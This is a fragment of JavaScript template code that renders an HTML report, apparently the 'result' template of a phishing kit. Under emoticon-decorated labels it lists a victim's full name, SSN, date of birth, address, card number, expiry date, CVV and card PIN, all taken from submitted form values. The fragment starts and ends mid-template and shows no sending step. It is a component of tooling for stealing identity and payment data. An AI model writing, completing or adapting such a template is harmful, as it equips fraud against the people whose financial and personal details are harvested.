...
<br>
<h4>BILLING</h4>
<p>| (▰˘◡˘▰) FULL NAME ☞ <b>${JSON.parse(values.billing[0]).fullname}</b></p>
<p>| (▰˘◡˘▰) SSN ☞ <b>${JSON.parse(values.billing[0]).ssn}</b></p>
<p>| (▰˘◡˘▰) DOB ☞ <b>${JSON.parse(values.billing[0]).dob}</b></p>
<p>| (▰˘◡˘▰) STREET ADDRESS ☞ <b>${
        JSON.parse(values.billing[0]).address
      }</b></p>
...
<h4>CARD DETAILS</h4>
<p>| (▰˘◡˘▰) CARD NUMBER ☞ <b>${
        JSON.parse(values.cardDetails[0]).number
      }</b></p>
<p>| (▰˘◡˘▰) EXPIRATION DATE ☞ <b>${
        JSON.parse(values.cardDetails[0]).date
      }</b></B></p>
<p>| (▰˘◡˘▰) CVV ☞ <b>${JSON.parse(values.cardDetails[0]).cvv}</b></p>
<p>| (▰˘◡˘▰) CARD PIN ☞ <b>${JSON.parse(values.cardDetails[0]).pin}</b></p>
<br>
${
